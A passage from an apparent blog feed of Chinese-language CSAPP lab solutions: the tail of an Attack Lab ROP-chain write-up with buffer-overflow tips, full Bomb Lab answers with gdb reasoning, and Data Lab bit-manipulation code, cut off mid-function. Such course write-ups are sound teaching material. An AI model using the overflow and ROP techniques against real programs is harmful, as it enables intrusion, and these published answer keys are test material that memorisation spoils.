mov到rax再mov到rdi</p></li><li><p>然后调用ret到lea指令，这时候，rax保存着字符串的起始地址，然后再把rax mov到rdi</p></li><li><p>接着就是touch3的地址，让<code>mov rax rdi</code>下面那条ret直接跳转到touch3，攻击成功</p></li></ul><h3 id="几个注意点"><a href="#几个注意点" class="headerlink" title="几个注意点"></a>几个注意点</h3><ul><li>用vim的16进制编辑模式要加在打开vim时加<code>-b</code>，否则，会把诸如<code>c0</code>这一类大于<code>0x3f</code>的不属于ascii范围的字符修改成<code>3f</code></li></ul><ul><li>ret指令前释放栈帧，ret指令后rsp又加上8，所以设置字符串时如果操作rsp，需要考虑ret释放的8字节</li><li>指令的机器码放在栈上时不需要按照字节逆序排放。并且下一条指令相对于当前指令是放在更高的地址而不是更低的地址</li><li>ret指令从rsp指定的位置读出8字节的信息，所以设置跳转地址时也要对高4byte进行设置</li><li>注意gets遇到编码为0xFF的字符时不会终止读取</li></ul>]]></content>
    
    <summary type="html">
    
      CSAPP 攻击实验的解答
    
    </summary>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/categories/CSAPP/"/>
    
    
      <category term="CSAPP Lab" scheme="https://h-zex.github.io/tags/CSAPP-Lab/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Bomb Lab</title>
    <link href="https://h-zex.github.io/2017/09/15/CSAPP-Bomb-Lab/"/>
    <id>https://h-zex.github.io/2017/09/15/CSAPP-Bomb-Lab/</id>
    <published>2017-09-14T18:04:11.000Z</published>
    <updated>2019-07-02T15:43:51.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-Bomb-Lab"><a href="#CSAPP-Bomb-Lab" class="headerlink" title="CSAPP Bomb Lab"></a>CSAPP Bomb Lab</h1><h3 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h3><ol><li>Border relations with Canada have never been better.</li><li>1 2 4 8 16 32</li><li>多个答案<ul><li>0    207</li><li>1    311</li><li>2    707</li><li>3    256</li><li>4    389</li><li>5    206</li><li>6    682</li><li>7    327</li></ul></li><li><em>应该有多个答案</em><ul><li>7    0</li></ul></li><li>一个6个字符的字符串，字符串的ascii值依次为<ul><li>$9+k\times16$ </li><li>$15+k\times16$</li><li>$14+k\times16$</li><li>$5+k\times16$</li><li>$6+k\times16$</li><li>$7+k\times16$</li></ul></li><li>​      4 3 2 1 6 5</li></ol><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><h4 id="解答思路"><a href="#解答思路" class="headerlink" title="解答思路"></a>解答思路</h4><ul><li>string_not_equal函数比对(0x402400)位置的string与输入的string</li><li>直接运行gdb，<code>print (char*)0x402400</code>即可</li><li><em>不需要读完string_not_equal函数，可以猜测0x402400就是要找的，然后一试就过了。不过也不可以绝对相信函数名，或许出题人骗我们呢 2333</em></li></ul><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><h4 id="解答思路-1"><a href="#解答思路-1" class="headerlink" title="解答思路"></a>解答思路</h4><ul><li>汇编代码显示，调用read_six_numbers读入6个数字，放在从栈底开始的24个字节里。测试第一个是否为1，用循环测试后一个是否是前一个的2倍。所以直接输入<code>1  2  4  8  16  32</code>即可AC</li></ul><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lea    0xc(%rsp),%rcx //rcx=12+rsp</span><br><span class="line">lea    0x8(%rsp),%rdx //rdx=8+rsp</span><br><span class="line">mov    $0x4025cf,%esi //%d %d</span><br><span class="line">mov    $0x0,%eax</span><br><span class="line">callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure><p>从调用sscanf前的寄存器准备工作中看出，%esi放着格式字符串，用gdb<code>print (char*)0x4025cf</code>打印出<code>&quot;%d %d&quot;</code></p></li><li><p>然后测试读入的第一个数字是否大于7，如果是，explode_bomb</p></li><li><p>然后就是一个switch，用gdb<code>x/14w 0x402470</code>打印出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x402470:0x00400f7c0x000000000x00400fb90x00000000</span><br><span class="line">0x402480:0x00400f830x000000000x00400f8a0x00000000</span><br><span class="line">0x402490:0x00400f910x000000000x00400f980x00000000</span><br><span class="line">0x4024a0:0x00400f9f0x00000000</span><br></pre></td></tr></table></figure><p>按照对应关系确定第二个读入的数字即可</p></li></ul><h3 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h3><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li>同样是用sscanf读入两个数字</li><li>由于逻辑比较复杂，但是反编译比较简单，可以直接反编译得到结果</li></ul><h3 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h3><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">callq  40131b &lt;string_length&gt;</span><br><span class="line">cmp    $0x6,%eax</span><br></pre></td></tr></table></figure><p>读入6个字符的字符串</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">mov    %cl,(%rsp)</span><br><span class="line">mov    (%rsp),%rdx</span><br><span class="line">and    $0xf,%edx</span><br><span class="line">movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">mov    %dl,0x10(%rsp,%rax,1)</span><br></pre></td></tr></table></figure><p>提取每个字符的ascii的低4bits，放在<code>edx</code>里，然后从<code>0x4024b0+edx</code>的位置读入数据放在栈上</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x40245e,%esi</span><br><span class="line">lea    0x10(%rsp),%rdi</span><br><span class="line">callq  401338 &lt;strings_not_equal&gt;</span><br></pre></td></tr></table></figure><p>后面调用了strings_not_equal，比对0x40245e处的字符串及我们放在栈上的数据。</p></li><li><p>用gdb分别打印0x4024b0  0x40245e处的字符串，获得</p><ul><li><code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code></li><li><code>flyers</code></li></ul></li><li><p>此时可以知道，前面提取数据时，是以我们输入的字符的低4bit的数值为偏移量，从0x4024b0开始的字符串按照偏移量提取字符放在栈上，然后与<code>flyers</code>比对。偏移量依次为$9\ 15\ 14\ 5\ 6\ 7$</p></li><li><p>但是这些字符不可打印出来，所以我们需要加上$16\times k$来获得可打印的字符</p></li></ul><h3 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h3><h4 id="一些心得"><a href="#一些心得" class="headerlink" title="一些心得"></a>一些心得</h4><ul><li><p>不要尝试完整的人肉反汇编成C，而是大概知道哪段代码有哪些功能，然后用gdb调试，看看猜的对不对。比如本题以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#from 代码段的401153</span><br><span class="line">lea    0x18(%rsp),%rsi</span><br><span class="line">mov    %r14,%rax</span><br><span class="line">mov    $0x7,%ecx</span><br><span class="line"></span><br><span class="line">mov    %ecx,%edx</span><br><span class="line">sub    (%rax),%edx</span><br><span class="line">mov    %edx,(%rax)</span><br><span class="line">add    $0x4,%rax</span><br><span class="line">cmp    %rsi,%rax</span><br><span class="line">jne    401160 &lt;phase_6+0x6c&gt;</span><br></pre></td></tr></table></figure><p>大概知道是改变读入的数字的值，但是不确定确切功能，这时候可以在用gdb，在读入之后的地方设断点，打印这块内存区域的多个字节的值，然后再在这段代码执行后的地方设断点，打印值，观察变化，结合汇编代码，更加容易知道其功能</p></li><li><p>安利一个gdb插件<a href="https://github.com/longld/peda" target="_blank" rel="noopener">peda</a>，大大提高gdb的用户体验</p></li></ul><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li><p>整段代码分为 个部分</p><ul><li><p>0x4010fc 到 0x401106：读入6个数值</p></li><li><p>0x40110b 到 0x401151：一个大循环，对读入的数字的合法性进行检查，要求读入的数字的取值范围是$[1,6]$，并且相互之间不相等。（这时候或许就可以暴力了233333）</p></li><li><p>0x401153 到 0x40116d：另一个循环，对输入的数字顺序进行调整。（一开始想着直接看汇编，但是出错了，后来用gdb调试，很容易就看到了这个特性）</p></li><li><p>0x401176 到 0x4011a9：一个大循环把链表的node的地址按照一定顺序写到栈上（里面有多个小循环、跳转，比较复杂）。通过大概的反汇编、gdb打印该段代码执行前后内存的值、猜测、测试不同的输入的数字序列，获得该段的功能。</p><p>其中，该段中把关于0x6032d0的值写入栈中，所以用gdb命令<code>x/30w 0x6032d0</code>打印改地址附近的多个字节，结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x6032d0 &lt;node1&gt;:0x0000014c0x000000010x006032e00x00000000</span><br><span class="line">0x6032e0 &lt;node2&gt;:0x000000a80x000000020x006032f00x00000000</span><br><span class="line">0x6032f0 &lt;node3&gt;:0x0000039c0x000000030x006033000x00000000</span><br><span class="line">0x603300 &lt;node4&gt;:0x000002b30x000000040x006033100x00000000</span><br><span class="line">0x603310 &lt;node5&gt;:0x000001dd0x000000050x006033200x00000000</span><br><span class="line">0x603320 &lt;node6&gt;:0x000001bb0x000000060x000000000x00000000</span><br></pre></td></tr></table></figure><p>可以看到有6个node，每个node的第三个字节都对应另一个node的地址，很明显，这是一个链表。</p><p>由此可以知道该段代码的功能为<strong>把node的地址写在栈上，地址在栈上的排列顺序由读入的数字确定</strong>。当然，读入的数字的顺序在前面的一段代码被处理了，所以直接从汇编了解其逻辑比较难，还是用gdb打印该段代码执行后的值，并且尝试改变输入的数字的顺序来确定该段的逻辑。</p><p><strong>node地址在栈上关于读入的数字的分布规则为</strong></p><ul><li>node地址越大，对应的数字越小，1对应0x603320，2对应0x603310，3对应0x603300，4对应0x6032f0，5对应0x6032e0，6对应0x6032d0</li><li>node地址按照读入数字的顺序，排列在栈上。</li></ul></li><li><p>0x4011ab 到 0x4011d9：该段从<code>%rsp+0x20</code>开始，读入前面写到栈上的node地址，然后写到上一个节点的偏移量为8bit的位置，也就是node里存放next node的指针的位置。其实就是按照栈上node地址的排列顺序重新排列链表里node的顺序，其等价的C代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="keyword">int</span> index;</span><br><span class="line">node *next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">node **next = %rsp+<span class="number">0x28</span>;</span><br><span class="line">node **endnode = %rsp+<span class="number">0x50</span>;</span><br><span class="line">node *currentnode = *(%rsp+<span class="number">0x20</span>);</span><br><span class="line">node *temp;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">temp = *next;</span><br><span class="line">currentnode-&gt;next = temp;</span><br><span class="line">next += <span class="number">1</span>;<span class="comment">//in fact, it add 8 bytes;</span></span><br><span class="line"><span class="keyword">if</span>(endnode==next)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">currentnode = temp;</span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;next = null;</span><br></pre></td></tr></table></figure></li><li><p>0x4011df 到 0x4011f5：依次访问链表的节点，判断是否有后一个节点的数据大于前一个的情况，如果有，bomb。</p></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      CSAPP 炸弹实验的解答
    
    </summary>
    
      <category term="CSAPP" scheme="https://h-zex.github.io/categories/CSAPP/"/>
    
    
      <category term="CSAPP Lab" scheme="https://h-zex.github.io/tags/CSAPP-Lab/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Data Lab</title>
    <link href="https://h-zex.github.io/2017/09/13/CSAPP-Data-Lab/"/>
    <id>https://h-zex.github.io/2017/09/13/CSAPP-Data-Lab/</id>
    <published>2017-09-13T05:39:11.000Z</published>
    <updated>2019-07-02T15:43:51.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-data-Lab"><a href="#CSAPP-data-Lab" class="headerlink" title="CSAPP data Lab"></a>CSAPP data Lab</h1><blockquote><p>注意，本文代码出于节省括号避免繁杂的考虑，对运算符优先级利用得比较充分，比如 1&gt;&gt;n+1 等价于 1&gt;&gt;(n+1)，所以代码里写了1&gt;&gt;n+1。</p></blockquote><h3 id="bitAnd"><a href="#bitAnd" class="headerlink" title="bitAnd"></a>bitAnd</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitAnd - x&amp;y using only ~ and | </span></span><br><span class="line"><span class="comment"> *   Example: bitAnd(6, 5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ |</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitAnd</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~(~x|~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>德摩根定律</li></ul><h3 id="getByte"><a href="#getByte" class="headerlink" title="getByte"></a>getByte</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * getByte - Extract byte n from word x</span></span><br><span class="line"><span class="comment"> *   Bytes numbered from 0 (LSB) to 3 (MSB)</span></span><br><span class="line"><span class="comment"> *   Examples: getByte(0x12345678,1) = 0x56</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 6</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getByte</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> bias = n&lt;&lt;<span class="number">3</span>;</span><br><span class="line"><span class="keyword">return</span> (x&gt;&gt;bias)&amp;<span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ul><li>移位到最低的1byte然后用0xFF提取</li></ul><h3 id="logicalShift"><a href="#logicalShift" class="headerlink" title="logicalShift"></a>logicalShift</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalShift - shift x to the right by n, using a logical shift</span></span><br><span class="line"><span class="comment">i</span></span><br><span class="line"><span class="comment"> *   Can assume that 0 &lt;= n &lt;= 31</span></span><br><span class="line"><span class="comment"> *   Examples: logicalShift(0x87654321,4) = 0x08765432</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 20</span></span><br><span class="line"><span class="comment"> *   Rating: 3 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalShift</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="number">1</span>&lt;&lt;<span class="number">32</span>+~n&lt;&lt;<span class="number">1</span>)+~<span class="number">0</span> &amp; (x&gt;&gt;n);</span><br><span class="line">  <span class="comment">//equal to ((1&lt;&lt;31-n&lt;&lt;1)-1)&amp;(x&gt;&gt;n);</span></span><br><span class="line">  <span class="comment">//负号优先级高于移位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ul><li><p>因为不能用<code>-</code>，所以用取反加一代替取负</p></li><li><p>构造低<code>32-n</code>bit的1来提取移位后的数值</p></li><li><p>因为移位量不能小于0或大于等于32，所以对于n可能是0而导致移位量是32的情况，先移位31位，再移位1位</p><blockquote><p>小技巧，如果n移位k，k$\in$[0, 32]，则可以<code>n&gt;&gt;(k-!!k)&gt;&gt;!!k</code></p></blockquote></li></ul><h3 id="bitCount"><a href="#bitCount" class="headerlink" title="bitCount"></a>bitCount</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitCount - returns count of number of 1's in word</span></span><br><span class="line"><span class="comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 40</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitCount</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> mark1 = <span class="number">0x55</span>;</span><br><span class="line"><span class="keyword">int</span> mark2 = <span class="number">0x33</span>;</span><br><span class="line"><span class="keyword">int</span> mark3 = <span class="number">0x0F</span>;</span><br><span class="line">mark1 |= mark1&lt;&lt;<span class="number">8</span>;</span><br><span class="line">mark1 |= mark1&lt;&lt;<span class="number">16</span>;</span><br><span class="line">mark2 |= mark2&lt;&lt;<span class="number">8</span>;</span><br><span class="line">mark2 |= mark2&lt;&lt;<span class="number">16</span>;</span><br><span class="line">mark3 |= mark3&lt;&lt;<span class="number">8</span>;</span><br><span class="line">mark3 |= mark3&lt;&lt;<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">x = (x&gt;&gt;<span class="number">1</span>&amp;mark1)+(x&amp;mark1);<span class="comment">//every two bits; clear record;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">2</span>&amp;mark2)+(x&amp;mark2);<span class="comment">//every four bits; clear record;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">4</span>&amp;mark3)+(x&amp;mark3);<span class="comment">//every eight bits; clear record;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">8</span>)+x;<span class="comment">//every 16 bits; record in the low 8 bits;</span></span><br><span class="line">x = (x&gt;&gt;<span class="number">16</span>)+x;<span class="comment">//every 32 bits; record in the low 8 bits;</span></span><br><span class="line"><span class="keyword">return</span> x&amp;<span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ul><li>构造0x55555555，提取每两位中的low bit。通过移位及0x55555555，提取每两位中的高位。然后相加，使得结果中，每两位的二进制值就是该两位的bit数目</li><li>同样的思路，提取每四位的low bit、high bit，然后相加</li><li>因为32==100000(二级制)，也就是只需要5位就可以记录有多少bit数，所以不需要每次都构造常数屏蔽高位的值，直接移位相加然后取低8bit就可以得到最终结果</li></ul><h3 id="bang"><a href="#bang" class="headerlink" title="bang"></a>bang</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bang - Compute !x without using !</span></span><br><span class="line"><span class="comment"> *   Examples: bang(3) = 0, bang(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">x |= x&gt;&gt;<span class="number">1</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">2</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">4</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">8</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">16</span>;</span><br><span class="line"><span class="keyword">return</span> ~x&amp;<span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><ul><li>如果非0，位模式从最高位的1到最低位都填充为1，</li><li>如果为0，则位模式还是保持全0</li></ul><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two's complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fitBits"><a href="#fitBits" class="headerlink" title="fitBits"></a>fitBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * fitsBits - return 1 if x can be represented as an </span></span><br><span class="line"><span class="comment"> *  n-bit, two's complement integer.</span></span><br><span class="line"><span class="comment"> *   1 &lt;= n &lt;= 32</span></span><br><span class="line"><span class="comment"> *   Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fitsBits</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !(x&gt;&gt;n+~<span class="number">0</span>)|!((x&gt;&gt;n+~<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">  <span class="comment">//equal to !(x&gt;&gt;n-1) | !((x&gt;&gt;n-1)+1)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h4><ul><li>算术移n-1位，如果是负数，且可以用n bits的补码表示，则得到-1。如果是正数，则得到0。</li></ul><h3 id="divpwr2"><a href="#divpwr2" class="headerlink" title="divpwr2"></a>divpwr2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span></span><br><span class="line"><span class="comment"> *  Round toward zero</span></span><br><span class="line"><span class="comment"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divpwr2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> t = x&gt;&gt;<span class="number">31</span>;</span><br><span class="line"><span class="keyword">return</span> (x+(t&amp;<span class="number">1</span>&lt;&lt;n)+(~(t&amp;<span class="number">1</span>)+<span class="number">1</span>))&gt;&gt;n;</span><br><span class="line">  <span class="comment">//equal to (x+(t&amp;1&lt;&lt;n)-(t&amp;1))&gt;&gt;n;</span></span><br><span class="line">  <span class="comment">//note that &amp; 的优先级低于&lt;&lt;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h4><ul><li>直接移位是round down，无论是负数还是正数</li><li>所以要实现round to zero , C表达式为<code>x&lt;0 ? x+(pow(2,n)-1)&gt;&gt;n : x&gt;&gt;n</code></li></ul><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span 